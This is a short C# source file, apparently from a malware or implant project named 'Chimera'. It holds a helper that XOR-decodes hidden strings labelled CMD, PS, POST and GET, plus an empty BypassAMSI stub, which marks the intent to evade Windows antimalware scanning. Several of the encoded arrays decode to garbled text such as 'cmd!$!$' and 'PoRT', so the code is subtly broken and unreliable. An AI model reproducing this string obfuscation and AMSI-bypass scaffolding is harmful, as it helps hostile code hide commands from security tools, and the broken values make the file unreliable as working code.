using System;

namespace Chimera
{
    public static class StringHelper
    {
        private static readonly byte XorKey = 0x41;

        public static string Decode(byte[] encoded)
        {
            byte[] decoded = new byte[encoded.Length];
            for (int i = 0; i < encoded.Length; i++)
                decoded[i] = (byte)(encoded[i] ^ XorKey);
            return System.Text.Encoding.UTF8.GetString(decoded);
        }

        public static readonly byte[] CMD     = { 0x22, 0x2C, 0x25, 0x60, 0x65, 0x60, 0x65 };
        public static readonly byte[] PS      = { 0x31, 0x2E, 0x36, 0x65, 0x32, 0x29, 0x65,
                                                   0x60, 0x63, 0x63, 0x60, 0x2D, 0x65, 0x60, 0x65 };
        public static readonly byte[] SLASH_C = { 0x6E, 0x22 };
        public static readonly byte[] POST    = { 0x11, 0x2E, 0x13, 0x15 };
        public static readonly byte[] GET     = { 0x16, 0x24, 0x15 };

        public static void BypassAMSI() { }
    }
}
